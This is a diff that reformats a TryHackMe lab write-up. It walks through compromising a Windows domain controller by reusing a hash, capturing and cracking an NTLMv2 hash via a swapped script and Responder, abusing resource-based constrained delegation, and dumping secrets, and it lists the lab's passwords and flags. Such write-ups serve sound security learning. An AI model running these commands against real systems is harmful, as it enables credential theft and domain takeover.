@@ -1,17 +1,7 @@
----
-
----
-
 # The Summit
 
-**Platform:** TryHackMe
-**Difficulty:** Hard
-**Date:** May 15–16, 2026
-**Target IP:** 10.114.145.107
-
-
----
-
+Date: May 15–16, 2026
+Target IP: 10.114.145.107
 
 ## About
 
@@ -21,13 +11,10 @@ You are almost there; you can see the summit from where you stand. Even the IT t
 You can't stop now; with all of the information gathered, you will reach the very top and prove your skills.
 ```
 
-**Tasks:**
+## Tasks
 
 1. What is the user flag?
 2. What is the root flag?
-
-
----
 
 
 ## Initial Enumeration
@@ -86,9 +73,6 @@ echo "10.114.145.107 k2.thm K2RootDC.k2.thm" >> /etc/hosts
 ```
 
 
----
-
-
 ## Credential Reuse from Middle Camp
 
 First I want to check if any of the users from previous tasks can be targeted on this machine.
@@ -110,9 +94,6 @@ nxc winrm k2.thm -u j.smith -H 9545b61858c043477c350ae86c37b32f  # Pwn3d!
 ```
 
 ![[Pasted image 20260515144211.png]]
-
-
----
 
 
 ## WinRM as j.smith
@@ -146,13 +127,9 @@ Get-ACL C:\Scripts\backup.bat | Format-List
 **FullControl over a folder = Can delete and recreate any file inside it!**
 
 
---- 
-
-
 ## Responder → NTLMv2 Hash Capture
 
 With this access, we replace `backup.bat` with a UNC path pointing to our machine, forcing `o.armstrong` to reach out to us, while we are listening with Responder on our attacking-machine. This way we can try capturing the NTLMv2 hash!
-
 
 ```bash
 responder -I tun0
@@ -178,9 +155,6 @@ O.ARMSTRONG::K2:877c58002d3e8543:d7e66c6555fb5b4c8725b86b22e69647:01010000000000
 **Password:** `arMStronG08`
 
 
----
-
-
 ## WinRM as o.armstrong
 
 Now we can access `o.armstrong` with Evil-WinRM with the newly found password.
@@ -199,9 +173,6 @@ In `C:\Users\o.armstrong\Desktop` we find **User flag**, and `notes.txt`, which 
 
 *(Forgot picture)*
 **User flag:** `THM{400002b4b9fa7decb59019364388b8a3}`
-
-
----
 
 
 ## BloodHound Enumeration
@@ -229,9 +200,6 @@ o.armstrong → [MemberOf] → IT Director → [GenericWrite] → K2ROOTDC.k2.th
 ```
 
 `IT Director` is a non-default group. `GenericWrite` on a **computer object** enables **Resource-Based Constrained Delegation (RBCD) attack**.
-
-
----
 
 
 ## RBCD Attack → Domain Admin
@@ -270,14 +238,11 @@ export KRB5CCNAME=Administrator@cifs_K2ROOTDC.k2.thm@K2.THM.ccache
 impacket-secretsdump -k -no-pass K2ROOTDC.k2.thm
 ```
 
-**Violá!** 
+**Violá!**
 
 ![[Pasted image 20260517230019.png]]
 
 **Administrator NTLM hash:** `15ecc755a43d2e7c8001215609d94b90`
-
-
----
 
 
 ## Root flag
@@ -291,6 +256,3 @@ evil-winrm -i k2.thm -u Administrator -H 15ecc755a43d2e7c8001215609d94b90
 **Root flag:** `THM{2000099729df1a4ec18bc0346d36b5ba}`
 
 **Domain Admin PWNED! And Summit reached!**
-
-
----
